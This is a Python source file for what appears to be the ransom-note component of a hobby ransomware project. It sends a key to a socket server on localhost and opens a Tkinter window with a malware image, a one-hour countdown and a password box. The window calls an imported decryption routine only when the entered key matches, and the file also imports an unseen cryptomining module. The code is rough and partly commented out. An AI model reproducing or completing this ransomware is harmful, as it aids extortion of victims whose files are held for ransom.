from dataclasses import dataclass
import socket
import sys
import tkinter as tk
from tkinter import font
import decrypt
from tkinter import *
import time
from tkinter import messagebox
import threading 
import Cryptomining
class Socke:
    def __init__(self,key):
        self.key=key
        try:
            host_ip = socket.gethostbyname('localhost')
        except socket.gaierror:
            print ("there was an error resolving the host")
            sys.exit()
        s.connect((host_ip,12345))
        s.send(self.key.encode())
        #k=s.recv(1024)
        """ t1=threading.Thread(target=GUi,args=(key,))
        t2=threading.Thread(target=GUi.TimerOut(self,))
        t1.start()
        t2.start()
        t1.join()
        t2.join()
        #s.close()"""

        GUi(key,"Hello")
        
    '''def socket(self,data):
        self.s.send(data)'''
        
class GUi:
    def __init__(self,Key,data):
        self.root=tk.Tk()
        print("Sumit")
        self.root.geometry("1000x563")
        self.passw_var=tk.StringVar()
        self.lab_var=tk.StringVar()
        self.Key=Key
        self.data=data
        self.root.title('User Interface')
        bg = PhotoImage(file = "hh.png")
        bg1 = PhotoImage(file = "malware.png")
        # Show image using label
        label1 = Label(self.root, image = bg)
        label1.place(x = 0, y = 0)
        
        label2 = Label(self.root,image=bg1)
        label2.place(x=2,y=2)
        
        self.hour=StringVar()
        self.minute=StringVar()
        self.second=StringVar()

        # setting the default value as 0
        self.hour.set("00")
        self.minute.set("00")
        self.second.set("00")

        # Use of Entry class to take input from the user
        hourEntry= Entry(self.root, width=3,fg='red',bg='green', font=("Arial",18,""),textvariable=self.hour)
        hourEntry.place(x=600,y=20)

        minuteEntry= Entry(self.root, width=3,fg='red',bg='green', font=("Arial",18,""),textvariable=self.minute)
        minuteEntry.place(x=650,y=20)

        secondEntry= Entry(self.root, width=3,fg='red',bg='green', font=("Arial",18,""),textvariable=self.second)
        secondEntry.place(x=700,y=20)
        
        """lab=tk.Label(self.root, text=self.data, fg='red', font = ('calibre',20,'bold'))
        lab.config(text=self.data)
        lab_pass=tk.Entry(self.root, textvariable = self.lab_var, font = ('calibre',20,'normal'), show = '*')
        sub_tn=tk.Button(self.root,text = 'Submit', command = self.Message)"""
        passw_label = tk.Label(self.root, text = 'Password',bg='black',fg='red', font = ('calibre',15,'bold'))
        passw_entry=tk.Entry(self.root, textvariable = self.passw_var, font = ('calibre',10,'normal'), show = '*')   
        sub_btn=tk.Button(self.root,text = 'Submit',bg='black',relief=RAISED,font=('Arial Bold', 18), command = self.submit)
        passw_label.place(relx=0.6,rely=0.2,relheight=0.05,relwidth=0.2)
        passw_entry.place(relx=0.6,rely=0.3,relheight=0.05,relwidth=0.2)
        sub_btn.place(relx=0.6,rely=0.4,relheight=0.05,relwidth=0.2)
        self.TimerOut()
        self.root.mainloop()

    def submit(self):
        password=self.passw_var.get()
        print("kale")
        if password == self.Key:
            decrypt.decryption(self.Key)
            self.root.destroy()
        else:
            passw_lab = tk.Label(self.root,bg='black',fg='red', text = 'WrongPassword', font = ('calibre',30,'bold'))
            passw_lab.place(relx=0.5,rely=0.6,relheight=0.08,relwidth=0.4)  
        self.passw_var.set("")
        
    #def Message(self):
        '''passs=self.lab_var.get()
        print("Bowled")
        s.send(passs.encode())
        print("six")
        self.lab_var.set("")'''
    
    def TimerOut(self):
        
        try:
            # the input provided by the user is
            # stored in here :temp
            temp = int(1)*3600 + int(0)*60 + int(0)
        except:
            print("Please input the right value")
        while temp >-1:
            
            # divmod(firstvalue = temp//60, secondvalue = temp%60)
            mins,secs = divmod(temp,60)

            # Converting the input entered in mins or secs to hours,
            # mins ,secs(input = 110 min --> 120*60 = 6600 => 1hr :
            # 50min: 0sec)
            hours=0
            if mins >60:
                
                # divmod(firstvalue = temp//60, secondvalue
                # = temp%60)
                hours, mins = divmod(mins, 60)
            
            # using format
            # 0.0 () method to store the value up to
            # two decimal places
            self.hour.set("{0:2d}".format(hours))
            self.minute.set("{0:2d}".format(mins))
            self.second.set("{0:2d}".format(secs))

            # updating the GUI window after decrementing the
            # temp value every time
            self.root.update()
            time.sleep(1)

            # when temp value = 0; then a messagebox pop's up
            # with a message:"Time's up"
            if (temp == 0):
                messagebox.showinfo("Time Countdown", "Time's up ")
            
            # after every one sec the value of temp will be decremented
            # by one
            temp -= 1
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)